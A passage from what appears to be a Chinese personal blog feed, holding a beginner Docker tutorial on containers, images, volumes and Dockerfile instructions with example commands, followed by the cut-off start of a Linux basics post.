很重要的要说明的一点：<strong>Docker容器后台运行，就必须有一个前台进程</strong>。容器运行的命令如果不是那些一直挂起的命令（比如运行top，tail），就是会自动退出的。</p><p>​    这个是docker的机制问题，比如你的web容器，我们以niginx为例，正常情况下，我们配置启动服务只需要启动响应的service即可，例如service niginx start。但是，这样做nginx为后台进程模式运行，就导致docker前台没有运行的应用，这样的容器后台启动后，会立即自杀因为他觉得他没事可做了，所以最佳的解决方案是，将要运行的程序以前台进程的形式运行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f -t --<span class="built_in">tail</span> 容器ID </span><br><span class="line">-t 是加入时间戳</span><br><span class="line">-f 跟随最新的日志打印</span><br><span class="line">--<span class="built_in">tail</span> 数字 显示最后多少条</span><br></pre></td></tr></table></figure><p>​    照前文所说，容器被杀死的原因是没有前台进程，那我们运行以下这句：</p><p>docker run -d centos /bin/bash -c “while true;do echo hello hello;sleep 2;done”</p><p>​    可以发现，docker容器已经不会被杀死，并且查询日志，会一直返回hello hello。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker top 容器ID //查看容器内运行的进程</span><br><span class="line">docker inspect 容器ID //查看容器内部细节，以json数据返回</span><br><span class="line">docker <span class="built_in">exec</span> -it 容器ID bashshell</span><br><span class="line">docker attach 容器ID //也是进入容器</span><br></pre></td></tr></table></figure><p>​    attach和exec不同的是，attach直接进入容器启动命令的终端，不会启动新的进程。exec是在容器中打开新的终端，并且可以启动新的进程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -t 10 <span class="built_in">ls</span> -l /tmp //直接执行</span><br><span class="line">docker <span class="built_in">exec</span> -it 10 /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> 容器ID:容器内路径 目的主机路径 //从容器内拷贝文件到主机上</span><br></pre></td></tr></table></figure><hr><h4 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h4><h5 id="Docker镜像原理"><a href="#Docker镜像原理" class="headerlink" title="Docker镜像原理"></a>Docker镜像原理</h5><p>​    Docker镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变了和配置文件。</p><p>​    UnionFS(联合文件系统)：Union文件系统是一种分层、轻量级并且高性能的文件系统，<strong>它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下</strong>。Union文件系统时docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像(没有父镜像)，可以制作各种具体的应用镜像。 特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p><p>​    docker镜像加载原理：docker镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。     bootfs(boot file system)主要包含bootloader和kernel，bootloader主要是引导加载kernel，Linux刚启动时会加载bootfs文件系统，<strong>在Docker镜像的最底层是bootfs</strong>。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成后整个内核就都在内存之中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。    rootfs(root file system)，在bootfs之上，包含的就是典型Linux系统中的/dev，/proc ，/bin，/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，CentOS等等。</p><p>​    对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就行了。由此可见对于不同linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以共用bootfs。</p><p>​    分层的镜像：以pull为例，我们看到的docker镜像是一层一层在下载，以tomcat为例，需要底层的jdk，centos系统再到kernel，所以这一层一层的共同凑出400多mb。<img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73418.jpg"                      alt="image-20220515222449051"                ></p><p>​    </p><p>​    docker采用这种分层系统的原因最大的一个好处就是可以共享资源。比如：有多个镜像都从相同的base镜像构建而来，那么宿主机只需要在磁盘上保存一份base镜像，同时内存中也只需加载一份base镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。</p><p>​    docker镜像特点：docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称为“容器层”，“容器层”之下的都叫“镜像层”。</p><hr><h4 id="Docker镜像commit"><a href="#Docker镜像commit" class="headerlink" title="Docker镜像commit"></a>Docker镜像commit</h4><p>​    docker commit提交容器副本使之成为一个新的镜像</p><p>​    docker commit -m=”提交的描述信息” -a=”作者” 容器ID 要创建的目标镜像名:[标签名]</p><p>案例演示：</p><p>​    1、下载tomcat镜像到本地并成功运行 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8080:8080 tomcat //-p:主机端口:容器端口</span><br></pre></td></tr></table></figure><p>​    2、删除容器内的docs文档（只凸显和原版本不同即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it ID /bin/bash</span><br><span class="line"><span class="built_in">rm</span> -f docs/</span><br></pre></td></tr></table></figure><p>​    3、目前的就是没有doc文档的tomcat，以他为模版commit一个没有doc的tomcat新镜像mes9s0/tomcat02</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a=<span class="string">&quot;mes9s0&quot;</span> -m=<span class="string">&quot;tomcat without docs&quot;</span> c3 mes9s0/tomcat02:1.2</span><br></pre></td></tr></table></figure><p>​    4、此时images就有我们自己的images了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073419.jpg"                      alt="image-20220516003734897"                ></p><hr><h4 id="Docker容器数据卷"><a href="#Docker容器数据卷" class="headerlink" title="Docker容器数据卷"></a>Docker容器数据卷</h4><h5 id="docker容器数据卷介绍"><a href="#docker容器数据卷介绍" class="headerlink" title="docker容器数据卷介绍"></a>docker容器数据卷介绍</h5><p>​    docker容器在启动后，我们对于某些数据修改的要求是希望持久化的，容器之间希望有可能共享数据。如果我们不commit生成新的，那么容器删除，数据就没有了。为了能够保存数据，我们使用卷。</p><p>​    卷就是目录或文件，存在于一个或多个容器，由docker挂载到容器，但不属于联合文件系统，因此能够绕过UnionFS提供一些用于持续存储或共享数据的特性。卷的设局目的就是数据的持久化，完全独立于容器的生存周期，因此Docker不会在删除容器时删除其挂在的数据卷。</p><p>​    特点：1、数据卷可以在容器之间共享或重用数据；2、卷中的更改可以直接生效；3、数据卷中的更改不会包含在镜像的更新中；4、数据卷的生命周期一直持续到没有容器使用它为止。</p><p>​    数据卷容器内添加：1、直接命令添加；2、DockerFile添加</p><h5 id="docker容器数据卷用v命令添加"><a href="#docker容器数据卷用v命令添加" class="headerlink" title="docker容器数据卷用v命令添加"></a>docker容器数据卷用v命令添加</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /宿主机绝对目录路径:/容器内目录 镜像名</span><br><span class="line">docker run -it -v /myDataVolume:/dataVolumeContainer centos</span><br><span class="line">//注意哪怕没有这两个路径也是会自动创建的，并且可读可写</span><br><span class="line">docker run -it -v /宿主机绝对目录路径:/容器内目录:ro 镜像名 //只读</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 容器ID //可以看到绑定成功</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073420.jpg"                      alt="image-20220516152500357"                ></p><p>​    绑定后的两个文件夹实现完全同步，注意，<strong>在容器停止后，修改宿主机上的目录，然后重启容器，容器内关联文件夹也是会同步的</strong>。</p><p>​    在命令加了ro后，只允许宿主机单向写，容器内只能看。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073421.jpg"                      alt="image-20220516153848353"                ></p><h5 id="docker容器数据卷用DockerFile添加"><a href="#docker容器数据卷用DockerFile添加" class="headerlink" title="docker容器数据卷用DockerFile添加"></a>docker容器数据卷用DockerFile添加</h5><p>​    dockerfile是docker images镜像的描述文件。添加有如下步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根目录下新建mydocker文件夹并进入</span><br><span class="line"><span class="built_in">mkdir</span> mydocker</span><br><span class="line"></span><br><span class="line">可在Dockerfile中使用volume指令来给镜像添加一个或多个数据卷</span><br><span class="line">VOLUME[<span class="string">&quot;/dataVolumeContainer&quot;</span>,<span class="string">&quot;/dataVolumeContainer2&quot;</span>,<span class="string">&quot;/dataVolumnContainer3&quot;</span>]</span><br></pre></td></tr></table></figure><p>​    出于可移植性和分享的考虑，用-v主机目录:容器目录这种方法不能够直接在Dockerfile中实现。因为不能保证宿主机都存在以上的特定目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File构建</span><br><span class="line"><span class="built_in">cd</span> mydocker</span><br><span class="line">vi Dockerfile</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073422.jpg"                      alt="image-20220516161105553"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">build后生成镜像</span><br><span class="line">docker build -f /mydocker/Dockerfile -t mess9s0/centos .</span><br><span class="line"></span><br><span class="line">run容器</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073423.jpg"                      alt="image-20220516162346548"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通过上述步骤，容器内的卷目录地址已经知道对应的主机目录地址在哪，随机生成的</span><br><span class="line">主机对应默认地址</span><br><span class="line">docker inspect 容器ID</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073424.jpg"                      alt="image-20220516163959892"                ></p><h5 id="docker容器数据卷volumes-from"><a href="#docker容器数据卷volumes-from" class="headerlink" title="docker容器数据卷volumes-from"></a>docker容器数据卷volumes-from</h5><p>​    命名的容器挂在数据卷，其他容器通过挂载这个(父容器)实现数据共享，挂载数据卷的容器，称之为数据卷容器。</p><p>​    先启动一个父容器mes9s01,在dataVolumeContainer2新增内容mess01</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name mes9s01 97</span><br></pre></td></tr></table></figure><p>​    mes9s02/mes9s03继承自mes9s01,可以看到直接有mess01文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name mes9s02 --volumes-from mes9s01 97</span><br><span class="line">docker run -it --name mes9s03 --volumes-from mes9s01 97</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073425.jpg"                      alt="image-20220516191210834"                ></p><p>​    现在有三个容器，1位父容器，2，3为子容器，他们的数据均可以互通，此时我们删除容器1，然后在容器2修改文件，可以观察到3可以继续被同步。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073426.jpg"                      alt="image-20220516192139747"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073428.jpg"                      alt="image-20220516192155821"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073429.jpg"                      alt="image-20220516192208155"                ></p><p>​    结论：容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止。</p><hr><h4 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h4><h5 id="dockerfile是什么"><a href="#dockerfile是什么" class="headerlink" title="dockerfile是什么"></a>dockerfile是什么</h5><p>​    dockerfile是用来构建docker镜像的构建文件，是由一系列命令和参数构成的脚本。</p><p>​    回顾前面通过dockerfile添加容器数据卷时的操作，目前可分为三部：1、手动编写dockerfile文件；2、有了文件后，直接docker build命令执行，获得一个自定义的镜像；3、run</p><h5 id="dockerfile解析过程"><a href="#dockerfile解析过程" class="headerlink" title="dockerfile解析过程"></a>dockerfile解析过程</h5><p>​    dockerfile内容基础知识：</p><p>​    1、每条保留字指令都必须为大写字母且后面要跟随至少一个参数。2、指令按照从上到下，顺序执行。3、#表示注释。4、每条指令都会创建一个新的镜像层，并对镜像进行提交。</p><p>​    docker执行Dockerfile的大致流程：1、docker从基础镜像运行一个容器；2、执行一条指令并对容器作出修改；3、执行类似docker commit的操作提交一个新容器；4、docker再基于刚提交的镜像运行一个新容器。5、执行dockerfile中的下一条指令直到所有指令都执行完成。</p><p>​    从不同的角度看，docker是软件的原材料，docker镜像是软件的交付品，docker容器则可以认为是软件的运行态。dockerfile面向开发，docker镜像称为交付标准，docker容器则涉及部署与运维，三者缺一不可。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073430.jpg"                      alt="image-20220516200557249"                ></p><h5 id="dockerfile保留字指令"><a href="#dockerfile保留字指令" class="headerlink" title="dockerfile保留字指令"></a>dockerfile保留字指令</h5><p>​    FROM：基础镜像，当前新镜像是基于哪个镜像的</p><p>​    MAINTAINER：镜像维护者的姓名和邮箱地址</p><p>​    RUN：容器构建时需要运行的命令</p><p>​    EXPOSE：当前容器对外暴露出的端口</p><p>​    WORKDIR：指定在创建容器后，终端默认登陆的进来工作目录，一个落脚点</p><p>​    ENV：用来在构建镜像过程中设置环境变量，例如：</p><p>​    ENV MY_PATH /usr/mytest，这个环境变量可以在后续的任何RUN指令中使用，这就如同在命令前面制定了环境变量前缀一样；也可以在其它指令中直接使用这些环境变量。比如：WORKDIR $MY_PATH</p><p>​    ADD：将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</p><p>​    COPY：类似ADD，拷贝文件和目录到镜像中。将从构建上下文目录中&lt;源路径&gt;的文件/目录复制到新的一层的镜像内的&lt;目标路径&gt;位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COPY src dest</span><br><span class="line">COPY [<span class="string">&quot;src&quot;</span>,<span class="string">&quot;dest&quot;</span>]</span><br></pre></td></tr></table></figure><p>​    VOLUME：数据容器卷，用于数据保存和持久化工作</p><p>​    CMD：指定一个容器启动时要运行的命令；Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换</p><p>​    ENTRYPOINT：指定一个容器启动时要运行的命令；ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及参数</p><p>​    ONBUILD：当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发</p><h5 id="dockerfile案例-自定义镜像mycentos"><a href="#dockerfile案例-自定义镜像mycentos" class="headerlink" title="dockerfile案例-自定义镜像mycentos"></a>dockerfile案例-自定义镜像mycentos</h5><p>​    Base镜像(scratch)：dockerhub中99%的镜像都是通过在base镜像中安装和配置需要的软件构建出来的</p><p>​    自定义镜像mycentos：1、编写；2、构建；3、运行；4、列出镜像的变更历史</p><p>​    1、编写：hub中默认的centos是没有vim、没有ifconfig的，我们让其带这两个功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FROM mes9s0/centos</span><br><span class="line">MAINTAINER mes9s0</span><br><span class="line"></span><br><span class="line">ENV mypath /tmp</span><br><span class="line">WORKDIR <span class="variable">$mypath</span></span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;success--------ok&quot;</span></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure><p>​    2、构建：docker build -t 新镜像名字:TAG .</p><p>​    注意，此时最新的是centos8的docker镜像，但是已经停止服务了，进入容器执行以下命令修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line"></span><br><span class="line">yum update -y</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f /mydocker/Dockerfile2 -t mycentos:1.3 .</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073431.jpg"                      alt="image-20220516223123719"                ></p><p>​    可以看到已经生成了新的镜像</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073432.jpg"                      alt="image-20220516223353433"                ></p><p>​    3、运行，可以看到新的镜像已经有vim和ipconfig了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073433.jpg"                      alt="image-20220516223901698"                ></p><p>​    4、列出镜像的变更历史</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">history</span> 镜像ID</span><br></pre></td></tr></table></figure><h5 id="dockerfile案例-CMD-ENTRYPOINT命令案例"><a href="#dockerfile案例-CMD-ENTRYPOINT命令案例" class="headerlink" title="dockerfile案例-CMD-ENTRYPOINT命令案例"></a>dockerfile案例-CMD-ENTRYPOINT命令案例</h5><p>首先看CMD和ENTRYPOINT，都是指定一个容器启动时要运行的命令。</p><p>dockerfile中可以有多个CMD命令，但只有最后一个生效，CMD会被docker run之后的参数替换。</p><p>我们以tomcat为例看看执行,会显示dockerfile里环境变量底下的ls -l命令，而覆盖掉启动命令，所以tomcat启动不起来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8888:8080 tomcat <span class="built_in">ls</span> -l</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073435.jpg"                      alt="image-20220516234708418"                ></p><p>ENTRYPOINT则是在docker run之后的参数会被当作参数传递给ENTRYPOINT，之后形成新的命令组合。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM mes9s0/centos</span><br><span class="line">RUN yum install -y curl</span><br><span class="line">CMD [ <span class="string">&quot;curl&quot;</span>,<span class="string">&quot;-s&quot;</span>,<span class="string">&quot;http://www.baidu.com&quot;</span> ]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build -f /mydocker/Dockerfile3 -t curlbaidu .</span><br><span class="line">docker run -it curlbaidu</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73436.jpg"                      alt="image-20220517000746222"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM mes9s0/centos</span><br><span class="line">RUN yum install -y curl</span><br><span class="line">ENTRYPOINT [ <span class="string">&quot;curl&quot;</span>,<span class="string">&quot;-s&quot;</span>,<span class="string">&quot;http://www.baidu.com&quot;</span> ]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it morebaidu -i</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073437.jpg"                      alt="image-20220517001451590"                ></p><p>​    可以发现使用ENTRYPOINT的命令不会被覆盖，相当于执行curl -s <a class="link"   href="http://www.baidu.com/" >http://www.baidu.com<i class="fas fa-external-link-alt"></i></a> -i</p><h5 id="dockerfile案例-ONBUILD命令"><a href="#dockerfile案例-ONBUILD命令" class="headerlink" title="dockerfile案例-ONBUILD命令"></a>dockerfile案例-ONBUILD命令</h5><p>​    这是dockerfile5，为父镜像的dockerfile</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM mes9s0/centos</span><br><span class="line">RUN yum install -y curl</span><br><span class="line">ENTRYPOINT [ <span class="string">&quot;curl&quot;</span>,<span class="string">&quot;-s&quot;</span>,<span class="string">&quot;http://www.baidu.com&quot;</span> ]</span><br><span class="line">ONBUILD RUN <span class="built_in">echo</span> <span class="string">&quot;father onbuild---------886&quot;</span></span><br></pre></td></tr></table></figure><p>​    这是子容器的dockerfile，dockerfile6，直接FROM 父类的新的images,可以看到触发器被执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM newbaidu_father</span><br><span class="line">RUN yum install -y curl</span><br><span class="line">CMD [ <span class="string">&quot;curl&quot;</span>,<span class="string">&quot;-s&quot;</span>,<span class="string">&quot;http://www.baidu.com&quot;</span> ]</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73439.jpg"                      alt="image-20220517004049626"                ></p><h5 id="dockerfile案例-自定义的tomcat9"><a href="#dockerfile案例-自定义的tomcat9" class="headerlink" title="dockerfile案例-自定义的tomcat9"></a>dockerfile案例-自定义的tomcat9</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FROM mes9s0/centos</span><br><span class="line">MAINTAINER mes9s0</span><br><span class="line"><span class="comment">#把宿主机当前上下文的c.txt拷贝进容器/usr/local路径下</span></span><br><span class="line">COPY c.txt /usr/local/cincontainer.txt</span><br><span class="line"><span class="comment">#把java与tomcat添加到容器中</span></span><br><span class="line">ADD jdk-8u202-linux-x64.tar.gz /usr/local/</span><br><span class="line">ADD apache-tomcat-9.0.63.tar.gz /usr/local/</span><br><span class="line"><span class="comment">#安装vim</span></span><br><span class="line">RUN yum -y install vim</span><br><span class="line"><span class="comment">#设置工作访问时候的WORKDIR路径，登陆落脚点</span></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line"><span class="comment">#配置java与tomcat环境变量</span></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_202</span><br><span class="line">ENV CLASSPATH <span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.63</span><br><span class="line">ENV CATALINA_BASE /usr/local/apache-tomcat-9.0.63</span><br><span class="line">ENV PATH <span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$CATALINA_HOME</span>/lib:<span class="variable">$CATALINA_HOME</span>/bin</span><br><span class="line"><span class="comment">#容器运行时监听的端口</span></span><br><span class="line">EXPOSE 8080</span><br><span class="line"><span class="comment">#启动时运行tomcat</span></span><br><span class="line"><span class="comment">#ENTRYPOINT [&quot;/usr/local/apache-tomcat-9.0.63/bin/startup.sh&quot;]</span></span><br><span class="line"><span class="comment">#CMD [&quot;/usr/local/apache-tomcat-9.0.63/bin/catalina.sh&quot;,&quot;run&quot;]</span></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.63/bin/startup.sh &amp;&amp; <span class="built_in">tail</span> -F /usr/local/apache-tomcat-9.0.63/bin/logs/catalina.out</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073441.jpg"                      alt="image-20220517015814025"                ></p><p>​    最后，如果上述都能看懂的话，docker的基础操作基本就是这些，再加上把自身生成的镜像推送到阿里云或者dockerhub等等即可，按着指示就行。docker基础差不多就到这里，后面会再去学习k8s、逃逸等的相关知识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    dockerdocker🥳&lt;/p&gt;
&lt;h4 id=&quot;docker介绍&quot;&gt;&lt;a href=&quot;#docker介绍&quot; class=&quot;headerlink&quot; title=&quot;docker介绍&quot;&gt;&lt;/a&gt;docker介绍&lt;/h4&gt;&lt;h5 id=&quot;docker背景&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="Docker学习基础篇" scheme="http://example.com/categories/Docker%E5%AD%A6%E4%B9%A0%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
    <category term="容器" scheme="http://example.com/tags/%E5%AE%B9%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础从零到一(1)</title>
    <link href="http://example.com/2022/05/11/Linux%E5%9F%BA%E7%A1%80%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1/"/>
    <id>http://example.com/2022/05/11/Linux%E5%9F%BA%E7%A1%80%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80-1/</id>
    <published>2022-05-11T14:21:42.000Z</published>
    <updated>2023-04-15T07:44:20.612Z</updated>
    
    <content type="html"><![CDATA[<p>​    本系列为个人基础知识补全以及为后续方便查找开设，里面会包括由于Linux基础知识的相关内容…</p><h4 id="系统调用过程"><a href="#系统调用过程" class="headerlink" title="系统调用过程"></a>系统调用过程</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74330.jpg"                      alt="image-20220511224047035"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074331.jpg"                      alt="image-20220511224404171"                ></p><hr><h4 id="Linux基本操作"><a href="#Linux基本操作" class="headerlink" title="Linux基本操作"></a>Linux基本操作</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 